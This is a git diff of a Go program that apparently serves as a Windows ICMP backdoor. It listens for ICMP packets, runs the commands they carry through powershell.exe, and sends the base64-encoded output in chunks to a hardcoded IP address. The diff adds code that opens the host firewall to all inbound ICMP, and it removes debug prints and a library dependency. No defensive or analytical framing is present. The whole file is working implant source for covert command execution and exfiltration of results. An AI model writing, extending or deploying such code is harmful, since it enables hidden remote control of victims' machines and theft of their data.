@@ -12,6 +12,7 @@ import (
 	"encoding/base64"
 	"encoding/hex"
 	"fmt"
+	wapi "github.com/iamacarpet/go-win64api"
 	uuid "github.com/satori/go.uuid"
 	"log"
 	"net"
@@ -21,16 +22,15 @@ import (
 	"time"
 	//"unsafe"
 
-	// External Libs
-	"github.com/kirito41dd/xslice"
 	//"github.com/satori/go.uuid"
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
 )
 
 const (
-	secretMessage = "Activate"
-	targetIP      = "10.20.214.167"
+	// To be used as an egg later
+	//secretMessage = "Activate"
+	targetIP = "10.10.100.199"
 )
 
 func NewCallBack() {
@@ -41,12 +41,25 @@ func NewCallBack() {
 }
 
 // SplitData is a function that will just take in a byte array and return it into a multi dimensional array
-func SplitData(data []byte, chunkSize int) [][]byte {
-	i := xslice.SplitToChunks(data, chunkSize)
-	ss := i.([][]byte)
-	return ss
-
+func SplitData(buf []byte, lim int) [][]byte {
+	var chunk []byte
+	chunks := make([][]byte, 0, len(buf)/lim+1)
+	for len(buf) >= lim {
+		chunk, buf = buf[:lim], buf[lim:]
+		chunks = append(chunks, chunk)
+	}
+	if len(buf) > 0 {
+		chunks = append(chunks, buf[:len(buf)])
+	}
+	return chunks
 }
+
+//func SplitData(data []byte, chunkSize int) [][]byte {
+//	i := xslice.SplitToChunks(data, chunkSize)
+//	ss := i.([][]byte)
+//	return ss
+//
+//}
 
 // EncodeData is a function that takes in a byte array and Encodes it into a b64 string
 func EncodeData(input string) string {
@@ -86,14 +99,9 @@ func SendData(data string, seq int) {
 // Added a chunking portion that handles large data outputs
 func PingListen(buf []byte, packetData int) {
 
-	//fmt.Println("[+] The full packet data:")
-	//fmt.Printf("% X\n", buf[:packetData])
-
-	fmt.Println("Inside PingListen")
 	src := buf[8:packetData]
 
 	hexToString := hex.EncodeToString(src)
-	fmt.Println(hexToString)
 
 	hexDecode, _ := hex.DecodeString(hexToString)
 
@@ -104,18 +112,19 @@ func PingListen(buf []byte, packetData int) {
 
 	output, _ := exec.Command("powershell.exe", "/c", string(command)).Output()
 
-	if len(output) > 6100 {
-		chunked := SplitData(output, 3000)
+	if len(output) > 6144 {
+		chunked := SplitData(output, 6144)
 		for _, row := range chunked {
 			data := EncodeData(string(row))
 			SendData(data, 3)
 			time.Sleep(2 * time.Second)
 		}
 
-	}
+	} else {
 
-	data := EncodeData(string(output))
-	SendData(data, 3)
+		data := EncodeData(string(output))
+		SendData(data, 3)
+	}
 
 }
 
@@ -124,6 +133,29 @@ func init() {
 }
 
 func main() {
+
+	// Enable ICMP Inbound
+	r := wapi.FWRule{
+		Name:              "Allow ICMP Inbound",
+		Description:       "Start answering ICMP requests",
+		Grouping:          "",
+		Enabled:           true,
+		Protocol:          wapi.NET_FW_IP_PROTOCOL_ICMPv4,
+		Action:            wapi.NET_FW_ACTION_ALLOW,
+		ICMPTypesAndCodes: "*", // https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml#icmp-parameters-types
+	}
+
+	ok, err := wapi.FirewallRuleAddAdvanced(r)
+	if !ok {
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			fmt.Printf("FW rule with name %q already exists.\n", r.Name)
+		}
+	}
+	if ok {
+		fmt.Println("Rule added!")
+	}
 
 	// while True loop to listen for ICMP data
 	for {
@@ -139,18 +171,14 @@ func main() {
 		if err != nil {
 			fmt.Printf("[-] Error in ListenIP: %s\n\n", err)
 		}
-		fmt.Println("After ListenIP")
 
 		buf := make([]byte, 100000)
-		fmt.Println("After buf call")
 
 		packetData, _, err := conn.ReadFrom(buf)
-		fmt.Println("Before error check for conn.ReadFrom")
 		if err != nil {
 			fmt.Printf("[+] Error reading packet data, %s\n\n", err)
 		}
 
-		fmt.Println("Right before PingListen call")
 		go PingListen(buf, packetData)
 
 	}
